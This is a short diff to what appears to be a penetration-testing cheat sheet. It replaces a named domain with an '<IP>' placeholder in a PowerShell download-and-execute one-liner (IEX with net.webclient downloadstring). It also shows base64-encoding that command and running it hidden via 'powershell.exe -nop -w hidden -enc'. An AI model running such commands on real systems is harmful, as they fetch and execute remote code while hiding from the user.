@@ -60,7 +60,7 @@ Set-Content -Value $([System.Convert]::FromBase64String($Base64)) -Encoding Byte
 
 #### Base64 encoded commands on Windows
 ```
-$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+$str = 'IEX ((new-object net.webclient).downloadstring("http://<IP>/a"))'
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 
 powershell.exe -nop -w hidden -enc <BASE64 STRING>
